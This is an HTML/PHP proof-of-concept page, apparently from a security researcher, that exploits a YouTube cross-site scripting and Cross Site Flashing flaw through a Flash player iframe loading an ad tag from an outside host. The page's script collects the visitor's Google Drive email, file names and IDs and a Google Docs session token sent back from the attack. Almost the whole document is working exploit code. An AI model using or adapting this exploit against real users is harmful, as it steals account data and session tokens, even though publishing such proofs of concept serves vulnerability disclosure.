<html>
	<head>
		<title>Proof of Concept - Youtube XSS and Cross Site Flashing - opNsec.com</title>
		<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script> 
	</head>
	<body>
	<div id="instructions" style="float:left">
	<h1>Youtube XSS and Cross Site Flashing POC :</h1>
	<h3>Prerequisites :</h3>
	- Tested on Windows 8.1/10 with Chrome 51, Firefox 47 and IE Edge (XSS only with IE 11)<br/>
	- Flash must be active <br/>
	- Any ads blocker must be desactivated <br/>
	- Optionally you may be logged in with a <b>testing Google Account</b> with Google Drive files<br/> 
	<h3>Instructions :</h3>
	1. Load this page and wait a few seconds (10-12 sec)<br/> 
	2. Your Google Drive/Docs info will show down if you are logged in Google<br/>
	3. The javascript payload will execute on www.youtube.com<br/>
	</div>
	<div style="clear:both">
		<div id="column2" style="float:left;width:400px;margin:10px;word-wrap:break-word;border-style:solid;">
			<p><b>drive.google.com</b></p>
			<div id="driveemail"></div><br/>
			<div id="drivefile"></div><br/>
			<div id="drive"></div>
		</div>

		<div id="column3" style="float:left;width:400px;margin:10px;word-wrap:break-word;border-style:solid;">
			<p><b>docs.google.com</b></p>
			<div id="docstoken"></div><br/>
			<div id="docs"></div>
		</div>
	</div>
<script>

		function driveLeak(data){
			//console.log(data);
			$("#drive").text("Source code : " + data);
			var regmatch = data.match('<div class="gb_[a-zA-Z0-9]{2}">([0-9a-zA-Z._-]+@[0-9a-zA-Z.-]{2,}[.][a-zA-Z]{2,5})</div>')
			if (regmatch != null)
			{
				$("#driveemail").text("Drive email = " + regmatch[1]);
			} else
			{
				$("#driveemail").text("not connected to drive");
			}
			
			var regex = /\[\\x22([a-zA-Z0-9-_\.]*)\\x22,\[\\x22[a-zA-Z0-9-_\.]*\\x22\]\\n,\\x22([a-zA-Z0-9-_\. ]*)\\x22,\\x22[a-zA-Z0-9-_\. ]*\\\/[a-zA-Z0-9-_\. ]*\\x22/g;
			var regmatch = regex.exec(data);
			 for (i = 0; i < 5 && (regmatch = regex.exec(data)) !== null; i++) {
				$("#drivefile").append("<br/>file " + (i+1) + " : <br>id = " + regmatch[1] + "<br/>Name = " + regmatch[2] + "<br/>");
			}
			if(i>0)
			{
				$("#drivefile").prepend("Drive files :");
			}
		}
		function docsLeak(data){
			//console.log(data);
			$("#docs").text("Source code : " + data);
			var regmatch = data.match('{"token":"([^"]*)"}')
			if (regmatch != null)
			{
				$("#docstoken").text("Docs session token = " + regmatch[1]);
			} else
			{
				$("#docstoken").text("not connected to drive");
			}
		}

		</script>

		<?php
$bieber = file_get_contents('https://www.youtube.com/watch?v=IiEDn1RuxOQ&list=PLvFYFNbi-IBFeP5ALr50hoOmKiYRMvzUq&index=4&html5_unavailable=1&nohtml5=1');
//echo $bieber;

if (preg_match('~"url":"(.*/watch_as3.swf)"~', $bieber, $watch_as3Array))
 {
$watch_as3 = $watch_as3Array[1];
/*echo $url_encoded_fmt_stream_map;
echo str_replace("\\u00", "%", rawurlencode($url_encoded_fmt_stream_map));
return;*/
 }
if (preg_match('~"args":\{.*\"url_encoded_fmt_stream_map":"([^"]*,|)([^,]*itag=18[^,]*)(,[^"]*|)".*\}~', $bieber, $url_encoded_fmt_stream_mapArray))
 {
$url_encoded_fmt_stream_map = $url_encoded_fmt_stream_mapArray[2];
/*echo $url_encoded_fmt_stream_map;
echo str_replace("\\u00", "%", rawurlencode($url_encoded_fmt_stream_map));
return;*/
 } else {
	 echo $bieber;
	 return;
 }
 if (preg_match('~"args":\{.*\"timestamp":"([^"]*)".*\}~', $bieber, $timestampArray))
 {
$timestamp = $timestampArray[1];
//echo $timestamp;
 }
 //return;
 
//echo $flashvars;
echo '<script>
window.onload=function(){
	var messageEle=document.getElementById(\'message\');
	function receiveMessage(e){
		if(decodeURI(e.data).substr(0,6) == "drive:"){
			driveLeak(decodeURI(e.data).substr(6));
		} else {
			
		docsLeak(decodeURI(e.data));
		}
		}
	window.addEventListener(\'message\',receiveMessage);
	}
</script>
<iframe src="https://www.youtube.com/v/IiEDn1RuxOQ?autoplay=1&timestamp='.$timestamp.'&token=1&afv=true&url_encoded_fmt_stream_map='.rawurlencode(str_replace("\\u0026", "&", $url_encoded_fmt_stream_map)).'&fmt_list=18/640x360/9/0/115&video_id=IiEDn1RuxOQ&ad3_module=1&sffb=true&enablejsapi=1&ssl=1&tpas_ad_type_id=1&invideo=true&afv_ad_tag=https%3A%2f%2felire.fr%2fgoogle%2fvpaidnonlinear.xml%3F" width="800" height="600"></iframe>
</body></html>';



?>
